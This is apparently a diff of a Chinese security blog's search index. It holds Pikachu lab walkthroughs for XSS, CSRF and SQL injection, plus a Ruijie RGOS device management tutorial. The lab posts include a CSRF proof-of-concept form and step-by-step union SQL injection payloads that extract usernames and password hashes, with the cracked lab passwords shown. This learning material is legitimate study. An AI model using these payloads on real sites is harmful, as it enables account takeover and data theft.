+<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
+<p>解决办法:</p>
+<p>切换PHP版本\刷新网页</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PiKachu--XSS</title>
     <url>/posts/96f58941/</url>
     <content><![CDATA[<h2 id="XSS（跨站脚本）概述"><a href="#XSS（跨站脚本）概述" class="headerlink" title="XSS（跨站脚本）概述"></a>XSS（跨站脚本）概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;<br>    2.存储型XSS;<br>    3.DOM型XSS;</p>
@@ -1326,183 +1503,6 @@ gpg:               已导入：1</code></pre>
 <p>这个漏洞的输出点是在JS中，通过用户的输入动态生成了JS代码</p>
 <p>JS有个特点，它不会对实体编码进行解释，如果想要用htmlspecialchars对我们的输入做实体编码处理的话, 在JS中不会把它解释会去，虽然这样解决了XSS问题，但不能构成合法的JS</p>
 <p>所以在JS的输出点应该对应该使用 \ 对特殊字符进行转义。</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu--CSRF</title>
-    <url>/posts/546fe1af/</url>
-    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
-<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
-<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
-<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
-<p>然后浏览器上代理，用burpsuite抓包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
-<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
-<p>也可以直接构造一个url:</p>
-<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
-<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
-<p>直接在包中修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
-<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
-<p>表单代码:</p>
-<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
-<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
-<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
-<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
-<p>解决办法:</p>
-<p>切换PHP版本\刷新网页</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu--SQL注入(一)</title>
-    <url>/posts/22ddbd5a/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
-</blockquote>
-<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
-<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
-<li>寻找SQL注入位置</li>
-<li>判断服务器类型和后台数据类型</li>
-<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
-</ol>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
-<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
-
-<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
-<p>查询数据库名称</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
-<p>查询user下所有表名</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
-<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
-<p>对应账号和MD5加密的密码：</p>
-<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
-<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
-<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
-<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
-<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
-或
-?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
-<p>也可以直接在url中的name参数后进行修改</p>
-<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
-<p>查询出所有账户数据</p>
-<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
-<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
-<hr>
-<p>参考链接： </p>
-<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
-<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -1868,6 +1868,436 @@ gpg:               已导入：1</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>RGOS日常管理操作</title>
+    <url>/posts/e25b2882/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>信息化发展的现状要求网络操作系统需要有新技术的植入，锐捷网络推出的新一代通用操作系统RGOS正 是技术创新的充分体现，它是为网络安全运行与管理而设计的完全模块化的支持多种平台的网络操作系统。 </li>
+<li>RGOS操作系统最主要的三大特性是模块化、安全性、开放性。自问世以来，锐捷网络通用操作系统RGOS， 已经在国内多个行业得到广泛应用，其实际应用价值深受广大用户的喜爱和称赞。以用户需求为中心，以 应用价值为导向，锐捷网络通过不断的技术创新，逐步将RGOS完善，新一代通用操作系统RGOS以其特有 稳定性、安全性等技术优势，更有助于提升用户使用价值，为用户创造更大的利益</li>
+</ul>
+<h2 id="RGOS平台登陆方式"><a href="#RGOS平台登陆方式" class="headerlink" title="RGOS平台登陆方式"></a>RGOS平台登陆方式</h2><h3 id="RGOS平台概述"><a href="#RGOS平台概述" class="headerlink" title="RGOS平台概述"></a>RGOS平台概述</h3><ul>
+<li>RGOS全称“锐捷通用操作系统”，即网络设备的操作系统 <ul>
+<li>基于RGOS开发的软件版本目前为11.x，又被称为11.x平台</li>
+</ul>
+</li>
+<li>优势 <ul>
+<li>模块化设计，方便运维管理 </li>
+<li>故障隔离，提升新功能开发测试效率和系统稳定性 </li>
+<li>对于硬件平台透明，兼容性高</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171419.png" alt="1" loading="lazy"></p>
+<h3 id="锐捷设备的常用登陆方式"><a href="#锐捷设备的常用登陆方式" class="headerlink" title="锐捷设备的常用登陆方式"></a>锐捷设备的常用登陆方式</h3><ul>
+<li>本地登陆：<ul>
+<li>Console登陆：全新或配置清空的设备，需要使用Console口的方式</li>
+</ul>
+</li>
+<li>远程登陆：<ul>
+<li>Telnet登陆：使用IP网络远程登陆，但传输的数据未加密 </li>
+<li>SSH登陆：使用IP网络远程登陆，传输数据加密，安全性高，常用SSHv2版本 </li>
+<li>Web登陆：使用网页登录，操作可视化较便捷 </li>
+<li>备注：大部分设备开局需要使用Console登陆，部分设备可直接Telnet&#x2F;Web登陆</li>
+</ul>
+</li>
+<li>常用登陆软件：SecureCRT、Putty、超级终端（仅XP有）</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171426.png" alt="2" loading="lazy"></p>
+<h3 id="使用Console登入"><a href="#使用Console登入" class="headerlink" title="使用Console登入"></a>使用Console登入</h3><ul>
+<li>Console概述<ul>
+<li>通过配置线连接设备的Console接口 </li>
+<li>使用终端软件进行设备管理配置 </li>
+<li>初始化，带外管理</li>
+</ul>
+</li>
+<li>Console管理配置 <ul>
+<li>波特率：9600 </li>
+<li>数据位：8</li>
+<li>奇偶校验：无</li>
+<li>停止位：1</li>
+<li>数据流控：无</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171431.png" alt="3" loading="lazy"></p>
+<h3 id="Telnet远程管理"><a href="#Telnet远程管理" class="headerlink" title="Telnet远程管理"></a>Telnet远程管理</h3><ul>
+<li>Telnet概述<ul>
+<li>指通过Windows命令行提示符中的Telnet程序或其他第三方Telnet程序进行设备管理配置 </li>
+<li>远程管理，带内管理 </li>
+<li>依赖于设备IP地址与Telnet密码 </li>
+<li>数据不进行加密</li>
+</ul>
+</li>
+<li>Telnet配置<ul>
+<li>协议：Telnet </li>
+<li>认端口：23  设备默认开启Telnet服务</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171435.png" alt="4" loading="lazy"></p>
+<h3 id="SSH远程管理"><a href="#SSH远程管理" class="headerlink" title="SSH远程管理"></a>SSH远程管理</h3><ul>
+<li>SSH概述<ul>
+<li>使用支持SSH协议程序（SecureCRT）进行设备管理配置 </li>
+<li>远程管理，带内管理 </li>
+<li>依赖于管理IP地址 </li>
+<li>依赖于全局用户名密码</li>
+<li>数据加密</li>
+</ul>
+</li>
+<li>SSH管理配置<ul>
+<li>协议：SSH</li>
+<li>默认端口：22</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">网络设备上开启SSH服务配置:
+Ruijie(config)#enable service ssh-server
+Ruijie(config)#crypto key generate &#123;rsa|dsa&#125;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171441.png" alt="5" loading="lazy"></p>
+<h3 id="登陆软件：SecureCRT"><a href="#登陆软件：SecureCRT" class="headerlink" title="登陆软件：SecureCRT"></a>登陆软件：SecureCRT</h3><ul>
+<li>日志管理 <ul>
+<li>根据锐捷网络技术服务部《JSZD-001技术服务部员工行为奖惩条例》工程师在网操作规范第3条：携带工程 师个人电脑进入客户网络时，需要提前做好电脑的杀毒等工作，以避免由于电脑病毒影响客户网络正常使用， 且开启记录功能（包括Telnet的控制台开启Log日志打印功能）</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171446.png" alt="6" loading="lazy"></p>
+<ul>
+<li>CRT交互窗口<ul>
+<li>当日志快速滚动刷屏无法键入时可以使用交互窗口 </li>
+<li>在交互窗口键入命令，可以在多个会话窗口执行</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171451.png" alt="7" loading="lazy"></p>
+<ul>
+<li>Xmodem使用 <ul>
+<li>使用Xmodem上传脚本或者下载配置文件。以上传为例：</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171458.png" alt="8" loading="lazy"></p>
+<h2 id="CLI命令行操作"><a href="#CLI命令行操作" class="headerlink" title="CLI命令行操作"></a>CLI命令行操作</h2><h3 id="CLI命令行基础"><a href="#CLI命令行基础" class="headerlink" title="CLI命令行基础"></a>CLI命令行基础</h3><ul>
+<li>使用Console、Telnet、SSH登陆设备后，将会出现CLI命令行界面，类似DOS的命令行</li>
+<li>相对CMD的命令行，RGOS的CLI使用便捷，具备丰富提示信息与错误信息</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171503.png" alt="9" loading="lazy"></p>
+<h3 id="CLI模式"><a href="#CLI模式" class="headerlink" title="CLI模式"></a>CLI模式</h3><ul>
+<li>用户模式 <ul>
+<li>字符光标前是一个“&gt;”符号</li>
+<li>有限查看设备信息</li>
+</ul>
+</li>
+<li>特权模式<ul>
+<li>字符光标前是一个“#”符号 </li>
+<li>查看设备所有信息</li>
+</ul>
+</li>
+<li>全局配置模式<ul>
+<li>字符光标前由“(config)#”组成</li>
+<li>配置设备全局参数</li>
+</ul>
+</li>
+<li>接口配置模式<ul>
+<li>字符光标前由“(config-if-xx)#”组成 </li>
+<li>配置设备接口参数</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171509.png" alt="10" loading="lazy"></p>
+<h3 id="CLI模式互换"><a href="#CLI模式互换" class="headerlink" title="CLI模式互换"></a>CLI模式互换</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171513.png" alt="11" loading="lazy"></p>
+<h3 id="命令行特性-分屏显示"><a href="#命令行特性-分屏显示" class="headerlink" title="命令行特性-分屏显示"></a>命令行特性-分屏显示</h3><ul>
+<li>在命令行界面，显示的内容如果超过一页的范围，则会进行分屏显示</li>
+<li>在命令行出现“–more–”的提示<ul>
+<li>使用“回车”键可以逐行显示 </li>
+<li>使用“空格”键可以翻页</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171517.png" alt="12" loading="lazy"></p>
+<h3 id="命令行特性-命令缩写及获取帮助"><a href="#命令行特性-命令缩写及获取帮助" class="headerlink" title="命令行特性-命令缩写及获取帮助"></a>命令行特性-命令缩写及获取帮助</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171523.png" alt="13" loading="lazy"></p>
+<h3 id="命令行特性-错误提示"><a href="#命令行特性-错误提示" class="headerlink" title="命令行特性-错误提示"></a>命令行特性-错误提示</h3><ul>
+<li>当命令输入错误时，系统将进行提示 <ul>
+<li>“% Unrecognized host or address, or protocol not running”代表命令无法识别，没有这个协议</li>
+<li>“% Incomplete command.”代表输入命令不完整</li>
+<li>“% Invalid input detected at ‘^’ marker.”代表所示位置命令有错</li>
+<li>还有许多其他提示，建议在配置命令行的时候多关注控制台的消息以及错误提示</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171528.png" alt="14" loading="lazy"></p>
+<h3 id="命令行特性-历史记录及TAB补全"><a href="#命令行特性-历史记录及TAB补全" class="headerlink" title="命令行特性-历史记录及TAB补全"></a>命令行特性-历史记录及TAB补全</h3><ul>
+<li>在命令行配置过程中，使用“TAB”键可以对目前的命令进行补全操作</li>
+<li>熟练应用“TAB”键以及“？”提示帮助，可以有效记忆命令</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608171533.png" alt="15" loading="lazy"></p>
